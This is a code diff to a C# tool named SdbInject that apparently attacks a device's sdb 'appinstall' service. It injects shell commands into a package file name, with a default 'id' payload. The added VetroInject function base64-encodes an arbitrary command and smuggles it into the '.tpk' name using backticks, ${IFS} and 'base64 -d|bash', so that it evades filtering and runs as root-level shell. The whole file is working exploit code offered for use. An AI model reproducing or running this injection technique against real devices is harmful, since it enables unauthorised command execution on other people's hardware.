@@ -43,7 +43,7 @@ internal static class SdbInject
 
         // pending service opens to try, in order
         string[] services = {
-            args.Length > 0 && args[0].StartsWith("svc:") ? args[0].Substring(4) : "shell:0 appinstall tpk " + (args.Length > 0 ? string.Join(" ", args) : "x;id>/tmp/inj.tpk"),
+            args.Length > 0 && args[0].StartsWith("svc:") ? args[0].Substring(4) : args.Length > 0 && args[0].StartsWith("v2:") ? VetroInject(args[0].Substring(3)) : "shell:0 appinstall tpk " + (args.Length > 0 ? string.Join(" ", args) : "x;id>/tmp/inj.tpk"),
         };
 
         while (Environment.TickCount < deadline)
@@ -78,5 +78,12 @@ internal static class SdbInject
             Thread.Sleep(300);
         }
         return 0;
+    }
+
+    static string VetroInject(string cmd)
+    {
+        var script = "/bin/mkdir -p /tmp/s-" + Guid.NewGuid().ToString("N").Substring(0,8) + " 2>/dev/null&&{ " + cmd + ";}";
+        var b64 = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(script));
+        return "shell:0 appinstall tpk new2.tpk`printf${IFS}%s${IFS}" + b64 + "|base64${IFS}-d|bash`.tpk";
     }
 }
